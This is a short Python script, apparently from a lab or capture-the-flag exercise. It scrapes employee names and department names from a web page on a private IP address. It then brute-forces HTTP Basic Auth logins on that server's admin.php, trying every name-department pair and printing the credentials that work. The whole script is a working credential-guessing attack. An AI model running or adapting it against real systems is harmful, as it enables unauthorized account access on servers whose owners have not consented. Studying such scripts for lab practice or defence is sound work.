import requests
import urllib
from bs4 import BeautifulSoup

# scrapping

def findnames(response):
    html_soup = BeautifulSoup(response.text, 'html.parser')
    data1=html_soup.find_all('td', id="name")
    names=list()
    for i in data1:
        names.append(i.text)
    return names

def findDepartment(response):
    html_soup = BeautifulSoup(response.text, 'html.parser')
    data1=html_soup.find_all('td', id="department")
    department=list()
    for i in data1:
        department.append(i.text)
    return department


def bruteforce(url, username, password):
    print("trying username: "+username+" and password: "+password)
    auth=requests.auth.HTTPBasicAuth(username, password)
    resp=requests.get(url=url, auth=auth)
    print(resp.status_code)
    if resp.status_code==200:
        return True
    else:
        return False


if __name__ == "__main__":
    url= "http://172.16.120.120/"
    response = requests.get(url)
    print("connected to web server")
    department=findDepartment(response)
    names=findnames(response)
    uri=url+"admin.php"
    creds=list()
    for i in names:
        for j in department:
            status=bruteforce(uri, i, j)
            if status==True:
                creds.append(i+": "+j)
            else:
                continue
            
    for i in creds:
        print(i)